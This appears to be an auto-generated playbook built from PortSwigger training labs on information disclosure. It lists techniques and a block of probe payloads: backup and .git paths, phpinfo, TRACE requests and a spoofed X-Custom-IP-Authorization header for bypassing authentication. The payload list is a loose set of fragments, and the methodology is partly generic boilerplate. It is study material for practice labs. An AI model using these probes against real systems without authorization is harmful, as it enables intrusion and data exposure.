## INFO DISCLOSURE Playbook
*Synthesized from 5 PortSwigger labs*

### Overview
This playbook covers 5 known attack techniques for info_disclosure.

### Attack Techniques

**Bypass Techniques:**
- Authentication bypass via information disclosure

**Error-based:**
- Information disclosure in error messages

**General:**
- Information disclosure in version control history
- Information disclosure on debug page
- Source code disclosure via backup files

### Key Payloads
```
productId
GET /admin
X-Custom-IP-Authorization: 127.0.0.1
/backup/ProductTemplate.java.bak
/cgi-bin/phpinfo.php
ADMIN_PASSWORD
admin.conf
ProductTemplate.java.bak
/.git
GET /product?productId="example"
administrator
/backup
X-Custom-IP-Authorization
localhost
productID
GET /product?productId=1
TRACE
"Remove admin password from config"
[TEST_USER]:[TEST_PASS]
TRACE /admin
```

### Indicators of Success
- Unexpected data in response
- Error messages revealing internal info
- Behavior change confirming injection
- Out-of-band callback received
- Access to unauthorized resources

### Testing Methodology
1. **Identify injection points** — forms, parameters, headers, cookies
2. **Test basic payloads** — start simple, escalate complexity
3. **Observe responses** — errors, timing, content changes
4. **Try bypasses** — encoding, alternative syntax, filter evasion
5. **Confirm impact** — data extraction, privilege escalation, RCE

